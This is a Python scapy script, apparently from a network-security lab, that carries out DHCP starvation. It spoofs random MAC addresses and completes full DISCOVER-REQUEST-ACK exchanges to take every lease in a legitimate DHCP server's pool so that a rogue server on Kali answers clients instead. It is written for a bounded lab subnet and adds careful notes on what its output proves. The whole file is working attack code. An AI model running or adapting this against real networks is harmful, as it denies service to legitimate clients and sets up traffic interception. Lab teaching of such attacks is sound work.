#!/usr/bin/env python3
"""Bounded DHCP starvation — claim the LEGITIMATE pool with verified full DORA.

Each iteration uses a fresh random MAC and completes DISCOVER -> OFFER ->
REQUEST -> ACK. Because the rogue server is also running, a single
first-answer-wins read (scapy's srp1) could see the rogue's reply first and
miss the legitimate offer. This script instead collects *all* replies within the
timeout (srp with multi=True) and then picks the offer from the legitimate server
(LEGIT_SERVER) for an address inside the legitimate pool (POOL_LO..POOL_HI). A
lease counts as claimed only when the REQUEST is answered by a real DHCPACK
(message-type 5) from that server — a NAK (type 6) or any other reply does not.

It is bounded by COUNT (set it to the legitimate pool size, e.g. 10 for
10.0.2.10-.19). It is not a flood. It requires Promiscuous Mode = Allow All so
offers to the spoofed MACs are visible. See instructor/virtualbox-lab-setup-LT.md.

What it proves: that the legitimate server handed these addresses to fake
clients (Observed from the ACKs). It does NOT by itself prove the pool is fully
exhausted — that needs server-side lease state. Treat "pool exhausted" as a
separate, server-side claim.

Run on Kali (rogue dnsmasq already running with its own .100-.110 pool):
    sudo python3 ~/scripts/dhcp_starve.py
"""
import random
import socket
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, srp, conf

IFACE = "<KALI_LAB_IF>"      # your Kali lab interface, e.g. eth0
COUNT = 10                   # legitimate pool size (.10-.19 = 10)
LEGIT_SERVER = "10.0.2.3"    # the legitimate DHCP server identifier
POOL_LO = "10.0.2.10"        # legitimate pool lower bound (inclusive)
POOL_HI = "10.0.2.19"        # legitimate pool upper bound (inclusive)
TIMEOUT = 3                  # seconds to wait for replies each round
conf.checkIPaddr = False

OFFER, ACK, NAK = 2, 5, 6


def mac_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))


def opt(pkt, name):
    for o in pkt[DHCP].options:
        if isinstance(o, tuple) and o[0] == name:
            return o[1]
    return None


def ip_int(ip):
    return int.from_bytes(socket.inet_aton(ip), "big")


def in_pool(ip):
    try:
        return ip_int(POOL_LO) <= ip_int(ip) <= ip_int(POOL_HI)
    except OSError:
        return False


def collect(stimulus):
    """Send one packet and return ALL DHCP replies seen within the timeout."""
    ans, _ = srp(stimulus, iface=IFACE, timeout=TIMEOUT, multi=True, verbose=0)
    return [rcv for _s, rcv in ans if DHCP in rcv]


claimed, ignored, naks = [], [], 0
for i in range(COUNT):
    fake = str(RandMAC())
    xid = random.randint(1, 0xFFFFFFFF)

    discover = (Ether(src=fake, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac_bytes(fake), xid=xid, flags=0x8000) /
                DHCP(options=[("message-type", "discover"), "end"]))

    # Collect every offer (not just the first), then pick the legitimate one —
    # so a faster rogue reply does not hide the legitimate server's offer.
    offers = [p for p in collect(discover) if opt(p, "message-type") == OFFER]
    legit = None
    for p in offers:
        sid, yi = str(opt(p, "server_id")), str(p[BOOTP].yiaddr)
        if sid == LEGIT_SERVER and in_pool(yi):
            legit = (yi, opt(p, "server_id"))
            break
        ignored.append((yi, sid))

    if not legit:
        others = f"{len(offers)} offer(s), none legitimate" if offers else "no offer"
        print(f"[{i:2}] {others} (timing/loss or pool pressure — not proof of exhaustion)")
        continue

    yiaddr, sid = legit
    request = (Ether(src=fake, dst="ff:ff:ff:ff:ff:ff") /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(chaddr=mac_bytes(fake), xid=xid, flags=0x8000) /
               DHCP(options=[("message-type", "request"),
                             ("requested_addr", yiaddr),
                             ("server_id", sid), "end"]))

    # Look for the legitimate server's ACK/NAK among all replies.
    acked = naked = False
    for p in collect(request):
        if str(opt(p, "server_id")) != LEGIT_SERVER:
            continue
        mt = opt(p, "message-type")
        if mt == ACK:
            acked = True
        elif mt == NAK:
            naked = True
    if acked:
        claimed.append(yiaddr)
        print(f"[{i:2}] ACK — claimed {yiaddr} from {sid}")
    elif naked:
        naks += 1
        print(f"[{i:2}] NAK for {yiaddr} from {sid} (not held)")
    else:
        print(f"[{i:2}] offered {yiaddr}, no ACK from {sid} (unconfirmed)")

print(f"\nClaimed {len(claimed)} legitimate lease(s): {claimed}")
if ignored:
    print(f"Ignored {len(ignored)} non-legitimate offer(s): {ignored}")
if naks:
    print(f"Received {naks} NAK(s).")
print("These ACKs show the legitimate server handed out those addresses "
      "(Observed pressure on its pool). They do NOT prove the pool is empty — "
      "that is a separate, server-side claim. The decisive evidence is which "
      "server Ubuntu accepts next (see rogue-dhcp-win.md step 3).")
